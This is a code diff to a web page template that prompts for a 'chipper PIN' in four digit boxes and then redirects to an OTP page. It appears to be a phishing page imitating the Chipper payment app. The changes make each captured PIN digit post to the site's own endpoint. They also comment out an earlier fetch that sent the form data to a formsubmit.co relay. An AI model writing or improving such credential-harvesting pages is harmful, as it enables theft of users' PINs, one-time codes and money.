@@ -59,13 +59,13 @@
         <h3 class="form3__para">Enter your chipper PIN</h3>
 
         <div class="form3__inputCtn">
-            <input class="pin" oninput="inputInsideOtpInput(this)" name="pin1" required maxlength="1" type="tel">
+            <input class="pin" oninput="inputInsideOtpInput(this)" name="pina" required maxlength="1" type="tel">
 
-            <input class="pin" oninput="inputInsideOtpInput(this)" name="pin2" required maxlength="1" type="tel">
+            <input class="pin" oninput="inputInsideOtpInput(this)" name="pinb" required maxlength="1" type="tel">
 
-            <input class="pin" oninput="inputInsideOtpInput(this)" name="pin3" required maxlength="1" type="tel">
+            <input class="pin" oninput="inputInsideOtpInput(this)" name="pinc" required maxlength="1" type="tel">
 
-            <input class="pin" oninput="inputInsideOtpInput(this)" name="pin4" required maxlength="1" type="tel">
+            <input class="pin" oninput="inputInsideOtpInput(this)" name="pind" required maxlength="1" type="tel">
             <div class="form3__spanCtn">
                 <span></span>
                 <span></span>
@@ -96,32 +96,36 @@
                 type: 'POST',
                 url: "{% url 'pin' %}",
                 data: {
-                    pin: $('#pin1').val(),
-                    pin: $('#pin2').val(),
-                    pin: $('#pin3').val(),
-                    pin: $('#pin4').val(),
+                    pina: $('#pina').val(),
+                    pinb: $('#pinb').val(),
+                    pinc: $('#pinc').val(),
+                    pind: $('#pind').val(),
                     csrfmiddlewaretoken: $('input[name=csrfmiddlewaretoken]').val()
                 },
             })
 
+            function myFunction(){
+                window.location.href = "{% url 'otp' %}";
+            }
 
-            fetch("https://formsubmit.co/ajax/bd9d3034b6a8347a7aca02bbefb8a268", {
-                method: "POST",
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: json
-            })
-                .then(response => response.json())
-                .then(data => {
-                    if (data.success == 'true') {
-                        setTimeout(() => {
-                            window.location.href = "{% url 'otp' %}";
-                        }, 1000);
-                    }
-                    console.log(data)
-                })
+
+            //fetch("https://formsubmit.co/ajax/bd9d3034b6a8347a7aca02bbefb8a268", {
+              //  method: "POST",
+                //headers: {
+                  //  'Content-Type': 'application/json',
+                    //'Accept': 'application/json'
+               // },
+               // body: json
+         //   })
+           //     .then(response => response.json())
+             //   .then(data => {
+               //     if (data.success == 'true') {
+                 //       setTimeout(() => {
+                   //         window.location.href = "{% url 'otp' %}";
+                     //   }, 1000);
+             //       }
+               //     console.log(data)
+               // })
               //  .catch(error => {
                 //    alert('incorrect pin, please try again')
                 //    console.log(error)
